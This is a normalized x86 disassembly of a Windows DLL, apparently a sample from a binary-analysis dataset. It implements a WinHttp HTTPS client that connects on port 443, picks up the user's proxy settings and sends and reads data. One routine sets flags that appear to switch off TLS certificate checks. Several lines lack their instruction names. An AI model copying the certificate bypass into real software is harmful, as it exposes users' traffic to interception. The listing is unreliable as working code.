xor ebp ebp
push edi
push ebp
lea ebx [ esi + 0x10 ]
mov [ esp + 0x1c ] esi
mov ecx ebx
mov [ ebx ] al
call sub_10003420
mov cl [ esp + 0x13 ]
lea edi [ esi + 0x20 ]
mov [ esp + 0x24 ] ebp
mov [ edi ] cl
mov [ edi + 0x4 ] ebp
mov [ edi + 0x8 ] ebp
mov [ edi + 0xc ] ebp
mov dl [ esp + 0x13 ]
lea ecx [ esi + 0x30 ]
push ebp
mov [ esp + 0x28 ] 0x1
mov [ ecx ] dl
call sub_10003420
mov al [ esp + 0x13 ]
mov [ esi + 0x54 ] ebp
mov [ esi + 0x50 ] al
mov [ esi + 0x58 ] ebp
mov [ esi + 0x5c ] ebp
mov cl [ esp + 0x13 ]
mov [ esi + 0x64 ] ebp
mov [ esi + 0x60 ] cl
mov [ esi + 0x68 ] ebp
mov [ esi + 0x6c ] ebp
lea ecx [ esi + 0x70 ]
mov [ esp + 0x24 ] 0x4
call sub_10001000
push rw-data
mov [ esp + 0x28 ] 0x5
mov [ esi ] r--data
call sub_10007b94
add esp 0x4
mov ecx ebx
mov [ esp + 0x14 ] eax
push 0x1
push eax
call sub_100036f0
test al al
je r-xdata
push rw-data
call sub_10007b94
add esp 0x4
mov ebx eax
mov ecx edi
push 0x1
push ebx
call sub_100036f0
test al al
je r-xdata
mov edx [ esp + 0x14 ]
mov eax [ ebx + 0x4 ]
push edx
push rw-data
push eax
call sub_100022b0
mov eax [ esp + 0x20 ]
mov ecx [ ebx + 0x4 ]
mov [ ebx + 0x8 ] eax
add esp 0xc
mov [ ecx + eax * 2 ] bp
mov ecx [ esp + 0x1c ]
mov [ esi + 0x8 ] ebp
mov [ esi + 0xc ] ebp
mov [ esi + 0x4 ] ebp
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x18
retn
mov eax [ edi + 0x4 ]
cmp ebx ebp
mov ecx rw-data
jbe r-xdata
mov eax [ edi + 0x4 ]
mov [ edi + 0x8 ] ebx
mov [ eax + ebx * 2 ] bp
mov [ esp + 0x14 ] ebx
mov dx [ ecx ]
add ecx 0x2
mov [ eax ] dx
mov edx [ esp + 0x14 ]
add eax 0x2
dec edx
mov [ esp + 0x14 ] edx
jne r-xdata
sub_100022b0
mov eax [ esp + 0x4 ]
push esi
mov esi [ esp + 0x10 ]
mov ecx eax
test esi esi
jbe r-xdata
pop esi
retn
mov edx [ esp + 0xc ]
push edi
mov di [ edx ]
add edx 0x2
mov [ ecx ] di
add ecx 0x2
dec esi
jne r-xdata
pop edi
sub_10002300
push 0xffffffff
push sub_1001a102
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
mov esi ecx
mov [ esp + 0x8 ] esi
mov [ esi ] r--data
mov [ esp + 0x14 ] 0x5
call sub_10003200
lea ecx [ esi + 0x70 ]
mov [ esp + 0x14 ] 0x4
call sub_10001030
mov ecx [ esi + 0x64 ]
xor ebx ebx
cmp ecx ebx
je r-xdata
mov [ esi + 0x64 ] ebx
mov [ esi + 0x68 ] ebx
mov [ esi + 0x6c ] ebx
mov ecx [ esi + 0x54 ]
cmp ecx ebx
je r-xdata
mov al [ ecx - 0x1 ]
cmp al bl
je r-xdata
mov [ esi + 0x54 ] ebx
mov [ esi + 0x58 ] ebx
mov [ esi + 0x5c ] ebx
mov ecx [ esi + 0x34 ]
cmp ecx ebx
je r-xdata
mov al [ ecx - 0x1 ]
cmp al bl
je r-xdata
add ecx 0xfffffffe
push ecx
call sub_10014331
add esp 0x4
cmp al 0xff
je r-xdata
mov [ esi + 0x34 ] ebx
mov [ esi + 0x38 ] ebx
mov [ esi + 0x3c ] ebx
mov ecx [ esi + 0x24 ]
cmp ecx ebx
je r-xdata
mov al [ ecx - 0x1 ]
cmp al bl
je r-xdata
add ecx 0xfffffffe
push ecx
call sub_10014331
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
mov [ esi + 0x24 ] ebx
mov [ esi + 0x28 ] ebx
mov [ esi + 0x2c ] ebx
mov ecx [ esi + 0x14 ]
cmp ecx ebx
je r-xdata
mov al [ ecx - 0x1 ]
cmp al bl
je r-xdata
add ecx 0xfffffffe
push ecx
call sub_10014331
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
mov ecx [ esp + 0xc ]
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov al [ ecx - 0x1 ]
cmp al bl
je r-xdata
add ecx 0xfffffffe
push ecx
call sub_10014331
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
add ecx 0xfffffffe
push ecx
call sub_10014331
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
sub_10002440
push 0xffffffff
push sub_1001a14b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x60
mov al [ esp + 0x74 ]
push ebx
push esi
mov esi ecx
xor ebx ebx
lea ecx [ esp + 0x48 ]
push ebx
mov [ esp + 0x4c ] al
call sub_10003420
mov cl [ esp + 0x7c ]
push ebx
mov [ esp + 0x2c ] cl
lea ecx [ esp + 0x2c ]
mov [ esp + 0x74 ] ebx
call sub_10003420
mov dl [ esp + 0x7c ]
push ebx
lea ecx [ esp + 0x1c ]
mov [ esp + 0x74 ] 0x1
mov [ esp + 0x1c ] dl
call sub_10003420
mov al [ esp + 0x7c ]
push ebx
lea ecx [ esp + 0x3c ]
mov [ esp + 0x74 ] 0x2
mov [ esp + 0x3c ] al
call sub_10001da0
push rw-data
mov [ esp + 0x74 ] 0x3
call sub_10007b94
add esp 0x4
lea ecx [ esp + 0x48 ]
push eax
push rw-data
call sub_10003370
push 0xc
call sub_10014308
add esp 0x4
mov [ esp + 0xc ] eax
cmp eax ebx
mov [ esp + 0x70 ] 0x4
je r-xdata
xor eax eax
mov ecx [ esp + 0x7c ]
push ecx
mov ecx eax
call sub_100027e0
jmp r-xdata
push edi
cmp eax ebx
mov [ esp + 0x74 ] 0x5
je r-xdata
push 0x8007000e
call sub_10013b30
mov eax [ esp + 0x8 ]
cmp eax ebx
mov [ esp + 0x70 ] 0x3
mov [ esp + 0x8 ] eax
jne r-xdata
xor edi edi
mov edi [ eax ]
jmp r-xdata
mov ecx esi
call sub_10002ea0
mov eax [ esp + 0x80 ]
cmp eax ebx
je r-xdata
lea ecx [ esp + 0x8 ]
call sub_10002790
jmp r-xdata
push edi
call sub_10007b94
add esp 0x4
lea ecx [ esp + 0x2c ]
push eax
push edi
call sub_10003370
push rw-data
call sub_10007b94
add esp 0x4
lea ecx [ esp + 0x1c ]
push eax
push rw-data
call sub_10003370
mov edx [ r--data ]
lea eax [ esp + 0x4c ]
push edx
push ebx
push eax
lea ecx [ esi + 0x10 ]
call sub_10003470
mov ecx [ r--data ]
lea edx [ esp + 0x2c ]
push ecx
push ebx
push edx
lea ecx [ esi + 0x20 ]
call sub_10003470
mov eax [ r--data ]
mov ecx [ esp + 0x7c ]
push eax
push ebx
push ecx
lea ecx [ esp + 0x48 ]
call sub_10001ba0
lea edx [ esp + 0x5c ]
lea ecx [ esi + 0x70 ]
push edx
call sub_10001040
mov ecx [ r--data ]
mov [ esp + 0x74 ] 0x6
push ecx
push ebx
push eax
lea ecx [ esp + 0x48 ]
call sub_10003290
push 0x1
lea ecx [ esp + 0x60 ]
mov [ esp + 0x78 ] 0x5
call sub_10001da0
lea edx [ esp + 0x1c ]
mov ecx esi
push edx
call sub_10002bf0
test al al
pop edi
jne r-xdata
mov ecx esi
call sub_10002e00
mov eax [ esp + 0x84 ]
mov [ esp + 0x14 ] ebx
mov ecx esi
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] ebx
call sub_10002cc0
test al al
jne r-xdata
push eax
mov ecx esi
call sub_10003100
push 0x1
lea ecx [ esp + 0x3c ]
mov [ esp + 0x74 ] 0x2
call sub_10001da0
push 0x1
lea ecx [ esp + 0x1c ]
mov [ esp + 0x74 ] 0x1
call sub_10003420
push 0x1
lea ecx [ esp + 0x2c ]
mov [ esp + 0x74 ] bl
call sub_10003420
push 0x1
lea ecx [ esp + 0x4c ]
mov [ esp + 0x74 ] 0xffffffff
call sub_10003420
pop esi
xor al al
pop ebx
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
add esp 0x6c
retn 0x10
lea ecx [ esp + 0x10 ]
push 0x8
push ecx
mov ecx esi
call sub_10002d80
test al al
jne r-xdata
lea ecx [ esp + 0x8 ]
call sub_10002790
jmp r-xdata
mov eax [ esp + 0x8 ]
mov [ esp + 0x70 ] 0x3
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x8 ]
cmp ecx ebx
je r-xdata
push 0x1
lea ecx [ esp + 0x3c ]
mov [ esp + 0x74 ] 0x2
call sub_10001da0
mov ecx [ esp + 0x1c ]
cmp ecx ebx
je r-xdata
mov esi eax
add eax 0x8
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
call sub_10002820
mov [ esp + 0x8 ] ebx
mov ecx [ esp + 0x2c ]
mov [ esp + 0x1c ] ebx
cmp ecx ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] ebx
je r-xdata
mov al [ ecx - 0x1 ]
cmp al bl
je r-xdata
mov [ esp + 0x8 ] ebx
cmp esi ebx
je r-xdata
mov ecx [ esp + 0x4c ]
mov [ esp + 0x2c ] ebx
cmp ecx ebx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
je r-xdata
mov al [ ecx - 0x1 ]
cmp al bl
je r-xdata
add ecx 0xfffffffe
push ecx
call sub_10014331
add esp 0x4
cmp al 0xff
je r-xdata
push 0x1
mov ecx esi
call sub_10002870
mov ecx [ esp + 0x68 ]
pop esi
mov al 0x1
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x6c
retn 0x10
mov al [ ecx - 0x1 ]
cmp al bl
je r-xdata
add ecx 0xfffffffe
push ecx
call sub_10014331
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
add ecx 0xfffffffe
push ecx
call sub_10014331
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
sub_10002790
push esi
push edi
mov edi ecx
mov esi [ edi ]
test esi esi
je r-xdata
pop edi
pop esi
retn
lea eax [ esi + 0x8 ]
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ edi ] 0x0
test esi esi
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call [ SysFreeString@IAT ]
push esi
call sub_10014331
add esp 0x4
push eax
call sub_10014331
add esp 0x4
sub_100027e0
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push edi
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x1
call sub_10013b7c
test eax eax
mov [ esi ] eax
jne r-xdata
mov eax esi
pop edi
pop esi
retn 0x4
test edi edi
je r-xdata
push 0x8007000e
call sub_10013b30
sub_10002820
push esi
mov esi ecx
push edi
lea edi [ esi + 0x8 ]
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ edi ]
pop edi
pop esi
retn
test esi esi
je r-xdata
pop edi
xor eax eax
pop esi
retn
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call [ SysFreeString@IAT ]
push esi
call sub_10014331
add esp 0x4
push eax
call sub_10014331
add esp 0x4
sub_10002870
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call [ SysFreeString@IAT ]
test [ esp + 0x8 ] 0x1
je r-xdata
push eax
call sub_10014331
add esp 0x4
mov eax esi
pop esi
retn 0x4
push esi
call sub_10014331
add esp 0x4
sub_100028b0
push 0xffffffff
push sub_1001a19b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x60
mov al [ esp + 0x74 ]
push ebx
push esi
mov esi ecx
xor ebx ebx
lea ecx [ esp + 0x48 ]
push ebx
mov [ esp + 0x4c ] al
call sub_10003420
mov cl [ esp + 0x7c ]
push ebx
mov [ esp + 0x2c ] cl
lea ecx [ esp + 0x2c ]
mov [ esp + 0x74 ] ebx
call sub_10003420
mov dl [ esp + 0x7c ]
push ebx
lea ecx [ esp + 0x1c ]
mov [ esp + 0x74 ] 0x1
mov [ esp + 0x1c ] dl
call sub_10003420
mov al [ esp + 0x7c ]
push ebx
lea ecx [ esp + 0x3c ]
mov [ esp + 0x74 ] 0x2
mov [ esp + 0x3c ] al
call sub_10001da0
push rw-data
mov [ esp + 0x74 ] 0x3
call sub_10007b94
add esp 0x4
lea ecx [ esp + 0x48 ]
push eax
push rw-data
call sub_10003370
push 0xc
call sub_10014308
add esp 0x4
mov [ esp + 0xc ] eax
cmp eax ebx
mov [ esp + 0x70 ] 0x4
je r-xdata
xor eax eax
mov ecx [ esp + 0x7c ]
push ecx
mov ecx eax
call sub_100027e0
jmp r-xdata
push edi
cmp eax ebx
mov [ esp + 0x74 ] 0x5
je r-xdata
push 0x8007000e
call sub_10013b30
mov eax [ esp + 0x8 ]
cmp eax ebx
mov [ esp + 0x70 ] 0x3
mov [ esp + 0x8 ] eax
jne r-xdata
xor edi edi
mov edi [ eax ]
jmp r-xdata
mov ecx esi
call sub_10002ea0
mov eax [ esp + 0x80 ]
cmp eax ebx
je r-xdata
lea ecx [ esp + 0x8 ]
call sub_10002790
jmp r-xdata
push edi
call sub_10007b94
add esp 0x4
lea ecx [ esp + 0x2c ]
push eax
push edi
call sub_10003370
push rw-data
call sub_10007b94
add esp 0x4
lea ecx [ esp + 0x1c ]
push eax
push rw-data
call sub_10003370
mov edx [ r--data ]
lea eax [ esp + 0x4c ]
push edx
push ebx
push eax
lea ecx [ esi + 0x10 ]
call sub_10003470
mov ecx [ r--data ]
lea edx [ esp + 0x2c ]
push ecx
push ebx
push edx
lea ecx [ esi + 0x20 ]
call sub_10003470
mov eax [ r--data ]
mov ecx [ esp + 0x7c ]
push eax
push ebx
push ecx
lea ecx [ esp + 0x48 ]
call sub_10001ba0
lea edx [ esp + 0x5c ]
lea ecx [ esi + 0x70 ]
push edx
call sub_10001040
mov ecx [ r--data ]
mov [ esp + 0x74 ] 0x6
push ecx
push ebx
push eax
lea ecx [ esp + 0x48 ]
call sub_10003290
push 0x1
lea ecx [ esp + 0x60 ]
mov [ esp + 0x78 ] 0x5
call sub_10001da0
lea edx [ esp + 0x1c ]
mov ecx esi
push edx
call sub_10002bf0
test al al
pop edi
jne r-xdata
mov ecx esi
call sub_10002e00
mov eax [ esp + 0x84 ]
mov [ esp + 0x14 ] ebx
mov ecx esi
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] ebx
call sub_10002cc0
test al al
jne r-xdata
push eax
mov ecx esi
call sub_10003100
push 0x1
lea ecx [ esp + 0x3c ]
mov [ esp + 0x74 ] 0x2
call sub_10001da0
push 0x1
lea ecx [ esp + 0x1c ]
mov [ esp + 0x74 ] 0x1
call sub_10003420
push 0x1
lea ecx [ esp + 0x2c ]
mov [ esp + 0x74 ] bl
call sub_10003420
push 0x1
lea ecx [ esp + 0x4c ]
mov [ esp + 0x74 ] 0xffffffff
call sub_10003420
pop esi
xor al al
pop ebx
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
add esp 0x6c
retn 0x10
lea ecx [ esp + 0x10 ]
push 0x8
push ecx
mov ecx esi
call sub_10002d80
test al al
jne r-xdata
lea ecx [ esp + 0x8 ]
call sub_10002790
jmp r-xdata
mov esi [ esp + 0x8 ]
cmp esi ebx
je r-xdata
mov ecx [ esp + 0x8 ]
cmp ecx ebx
je r-xdata
push 0x1
lea ecx [ esp + 0x3c ]
mov [ esp + 0x74 ] 0x2
call sub_10001da0
mov ecx [ esp + 0x1c ]
cmp ecx ebx
je r-xdata
lea edx [ esi + 0x8 ]
push edx
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
call sub_10002820
mov [ esp + 0x8 ] ebx
mov ecx [ esp + 0x2c ]
mov [ esp + 0x1c ] ebx
cmp ecx ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] ebx
je r-xdata
mov al [ ecx - 0x1 ]
cmp al bl
je r-xdata
mov [ esp + 0x8 ] ebx
cmp esi ebx
je r-xdata
mov ecx [ esp + 0x4c ]
mov [ esp + 0x2c ] ebx
cmp ecx ebx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
je r-xdata
mov al [ ecx - 0x1 ]
cmp al bl
je r-xdata
add ecx 0xfffffffe
push ecx
call sub_10014331
add esp 0x4
cmp al 0xff
je r-xdata
push 0x1
mov ecx esi
call sub_10002870
mov ecx [ esp + 0x68 ]
pop esi
mov al 0x1
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x6c
retn 0x10
mov al [ ecx - 0x1 ]
cmp al bl
je r-xdata
add ecx 0xfffffffe
push ecx
call sub_10014331
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
add ecx 0xfffffffe
push ecx
call sub_10014331
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
sub_10002bf0
push esi
mov esi ecx
mov eax [ esi + 0x14 ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push eax
call [ WinHttpOpen@IAT ]
test eax eax
mov [ esi + 0x8 ] eax
je r-xdata
mov eax r--data
mov ecx [ esi + 0xc ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x24 ]
test ecx ecx
jne r-xdata
mov al 0x1
pop esi
retn 0x4
mov eax [ esp + 0x8 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
push 0x0
push 0x1bb
push ecx
push eax
call [ WinHttpConnect@IAT ]
mov [ esi + 0xc ] eax
mov ecx r--data
push 0x800000
push 0x0
push 0x0
push 0x0
push 0x0
push eax
push ecx
call [ WinHttpOpenRequest@IAT ]
mov [ esi + 0x4 ] eax
mov eax r--data
sub_10002c70
push esi
push 0x0
mov esi ecx
push 0x0
push 0x0
push 0x0
mov eax [ esi + 0x4 ]
push 0x0
push 0x0
push eax
call [ WinHttpSendRequest@IAT ]
test eax eax
jne r-xdata
mov ecx [ esi + 0x4 ]
push 0x0
push ecx
call [ WinHttpReceiveResponse@IAT ]
test eax eax
jne r-xdata
mov ecx esi
call sub_10003200
xor al al
pop esi
retn
mov al 0x1
pop esi
retn
mov ecx esi
call sub_10003200
xor al al
pop esi
retn
sub_10002cc0
push esi
push 0x0
mov esi ecx
push 0x0
push 0x0
push 0x0
mov eax [ esi + 0x4 ]
push 0x0
push 0x0
push eax
call [ WinHttpSendRequest@IAT ]
test eax eax
jne r-xdata
mov al 0x1
pop esi
retn
mov ecx esi
call sub_10003200
xor al al
pop esi
retn
sub_10002cf0
push esi
mov esi ecx
push 0x0
mov eax [ esi + 0x4 ]
push eax
call [ WinHttpReceiveResponse@IAT ]
test eax eax
jne r-xdata
mov al 0x1
pop esi
retn
mov ecx esi
call sub_10003200
xor al al
pop esi
retn
sub_10002d20
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi [ esp + 0x18 ]
test edi edi
mov ebx ecx
mov [ esp + 0x14 ] 0x0
jbe r-xdata
pop edi
pop esi
pop ebp
mov al 0x1
pop ebx
retn 0x8
mov ebp [ WinHttpReadData@IAT ]
mov ecx ebx
call sub_10003200
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor al al
pop ebx
retn 0x8
add esi eax
sub edi eax
jne r-xdata
mov ecx [ ebx + 0x4 ]
lea eax [ esp + 0x14 ]
push eax
push edi
push esi
push ecx
call ebp
test eax eax
je r-xdata
sub_10002d80
push ecx
mov edx [ esp + 0x8 ]
push esi
mov esi ecx
lea eax [ esp + 0x4 ]
mov ecx [ esp + 0x10 ]
push eax
mov eax [ esi + 0x4 ]
push ecx
push edx
push eax
mov [ esp + 0x14 ] 0x0
call [ WinHttpWriteData@IAT ]
test eax eax
jne r-xdata
mov al 0x1
pop esi
pop ecx
retn 0x8
mov ecx esi
call sub_10003200
xor al al
pop esi
pop ecx
retn 0x8
sub_10002dc0
mov eax [ esp + 0xc ]
mov edx [ esp + 0x4 ]
push esi
mov esi ecx
mov ecx [ esp + 0xc ]
push eax
mov eax [ esi + 0x4 ]
push ecx
push edx
push eax
call [ WinHttpWriteData@IAT ]
test eax eax
jne r-xdata
mov al 0x1
pop esi
retn 0xc
mov ecx esi
call sub_10003200
xor al al
pop esi
retn 0xc
sub_10002e00
sub esp 0xc
push esi
mov esi ecx
lea eax [ esp + 0xc ]
push edi
mov edx [ esi + 0x4 ]
lea ecx [ esp + 0xc ]
push eax
push ecx
push 0x1f
push edx
mov [ esp + 0x20 ] 0x4
call [ WinHttpQueryOption@IAT ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x10 ]
mov edi [ WinHttpSetOption@IAT ]
or dh 0x33
lea ecx [ esp + 0xc ]
mov [ esp + 0xc ] edx
mov edx [ esi + 0x4 ]
push eax
push ecx
push 0x1f
push edx
call edi
mov ecx [ esi + 0x4 ]
lea eax [ esp + 0x8 ]
push 0x4
push eax
push 0x6
push ecx
mov [ esp + 0x18 ] 0xa4cb80
call edi
mov eax [ esi + 0x4 ]
lea edx [ esp + 0x8 ]
push 0x4
push edx
push 0x3
push eax
call edi
mov edx [ esi + 0x4 ]
lea ecx [ esp + 0x8 ]
push 0x4
push ecx
push 0x5
push edx
call edi
mov ecx [ esi + 0x4 ]
lea eax [ esp + 0x8 ]
push 0x4
push eax
push 0x7
push ecx
call edi
pop edi
mov al 0x1
pop esi
add esp 0xc
retn
sub_10002ea0
sub esp 0x16c
push ebx
push ebp
push esi
mov ebp ecx
push edi
xor ebx ebx
mov ecx 0x18
xor eax eax
lea edi [ esp + 0x51 ]
mov [ esp + 0x50 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x31
xor eax eax
lea edi [ esp + 0xb6 ]
mov [ esp + 0xb4 ] bx
[ edi ]
stosw [ edi ]
xor eax eax
lea ecx [ esp + 0x10 ]
mov [ esp + 0x14 ] eax
push ecx
mov [ esp + 0x1c ] eax
mov [ esp + 0x14 ] ebx
mov [ esp + 0x20 ] eax
call [ WinHttpGetIEProxyConfigForCurrentUser@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x16c
retn
mov ecx [ esp + 0x18 ]
cmp ecx ebx
je r-xdata
cmp [ esp + 0x10 ] ebx
je r-xdata
mov edx [ esp + 0x1c ]
lea eax [ ebp + 0x44 ]
push 0xc
push eax
mov [ eax ] 0x3
mov eax [ ebp + 0x4 ]
push 0x26
push eax
mov [ ebp + 0x48 ] ecx
mov [ ebp + 0x4c ] edx
call [ WinHttpSetOption@IAT ]
mov ecx [ esp + 0x18 ]
mov esi [ GlobalFree@IAT ]
push ecx
call esi
mov eax [ esp + 0x1c ]
cmp eax ebx
je r-xdata
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
xor edx edx
lea esi [ ebp + 0x44 ]
mov [ esp + 0x24 ] edx
lea eax [ esp + 0x20 ]
mov [ esp + 0x28 ] edx
push esi
mov [ esp + 0x30 ] edx
lea ecx [ esp + 0xb8 ]
mov [ esp + 0x34 ] edx
push eax
mov [ esp + 0x3c ] edx
mov edx [ ebp + 0x8 ]
push ecx
push edx
mov [ esp + 0x30 ] 0x1
mov [ esp + 0x34 ] 0x3
call [ WinHttpGetProxyForUrl@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x16c
retn
push eax
call esi
xor ecx ecx
mov edi rw-data
mov [ esp + 0x3c ] ecx
xor edx edx
mov [ esp + 0x40 ] ecx
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] ecx
xor eax eax
mov [ esp + 0x48 ] ecx
mov [ esp + 0x24 ] edx
mov [ esp + 0x4c ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov [ esp + 0x28 ] edx
lea edx [ esp + 0x50 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax [ ebp + 0x24 ]
and ecx 0x3
cmp eax ebx
mov [ esp + 0x38 ] 0x2
mov [ esp + 0x20 ] ebx
[ edi ] [ esi ]
jne r-xdata
mov eax [ ebp + 0x4 ]
push 0xc
push esi
push 0x26
push eax
call [ WinHttpSetOption@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x2
pop ebx
add esp 0x16c
retn
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x50 ]
[ edi ]
not ecx
sub edi ecx
push ebx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push ebx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x58 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi [ MultiByteToWideChar@IAT ]
mov esi ecx
lea eax [ esp + 0x58 ]
inc esi
push esi
push eax
push ebx
push ebx
call edi
lea ecx [ esp + 0xb4 ]
push eax
push ecx
lea edx [ esp + 0x58 ]
push esi
push edx
push ebx
push ebx
call edi
lea eax [ esp + 0x20 ]
lea ecx [ esp + 0x38 ]
push eax
mov eax [ ebp + 0x8 ]
lea edx [ esp + 0xb8 ]
push ecx
push edx
push eax
call [ WinHttpGetProxyForUrl@IAT ]
test eax eax
jne r-xdata
mov eax r--data
mov edx [ ebp + 0x4 ]
lea ecx [ esp + 0x20 ]
push 0xc
push ecx
push 0x26
push edx
call [ WinHttpSetOption@IAT ]
mov eax [ esp + 0x1c ]
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x2
pop ebx
add esp 0x16c
retn
push eax
call [ GlobalFree@IAT ]
sub_10003100
push 0xffffffff
push sub_1001a1bb
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
push edi
mov edi ecx
push 0xc
call sub_10014308
mov esi eax
add esp 0x4
mov [ esp + 0x8 ] esi
test esi esi
mov [ esp + 0x14 ] 0x0
je r-xdata
xor esi esi
push ebx
mov ebx [ esp + 0x20 ]
push ebx
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x1
call sub_10013b7c
test eax eax
mov [ esi ] eax
jne r-xdata
lea eax [ edi + 0x44 ]
test esi esi
mov [ eax ] 0x3
je r-xdata
push 0x8007000e
call sub_10013b30
pop ebx
jmp r-xdata
test ebx ebx
je r-xdata
xor ecx ecx
mov ecx [ esi ]
jmp r-xdata
test esi esi
mov [ esp + 0x14 ] 0xffffffff
jne r-xdata
push 0x8007000e
call sub_10013b30
mov ecx [ esp + 0xc ]
pop edi
mov al 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
lea ecx [ esi + 0x8 ]
push ecx
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
push 0xc
push eax
mov eax [ edi + 0x4 ]
push 0x26
push eax
mov [ edi + 0x48 ] ecx
mov [ edi + 0x4c ] 0x0
call [ WinHttpSetOption@IAT ]
test esi esi
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call [ SysFreeString@IAT ]
push esi
call sub_10014331
add esp 0x4
push eax
call sub_10014331
add esp 0x4
sub_10003200
push esi
mov esi ecx
push edi
mov edi [ WinHttpCloseHandle@IAT ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
call edi
mov [ esi + 0xc ] 0x0
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
mov [ esi + 0xc ] 0x0
pop edi
pop esi
retn
push eax
call edi
mov [ esi + 0x8 ] 0x0
sub_10003250
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
retn
mov al [ ecx - 0x1 ]
test al al
je r-xdata
add ecx 0xfffffffe
push ecx
call sub_10014331
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
sub_10003290
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
push edi
mov edi [ esp + 0x14 ]
mov ebx ecx
cmp [ edi + 0x8 ] esi
jae r-xdata
mov eax [ edi + 0x8 ]
sub eax esi
mov esi [ esp + 0x1c ]
cmp eax esi
jae r-xdata
call sub_100108cc
mov eax [ r--data ]
mov edx [ ebx + 0x8 ]
sub eax edx
cmp eax esi
ja r-xdata
mov esi eax
test esi esi
jbe r-xdata
call sub_100106a0
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
retn 0xc
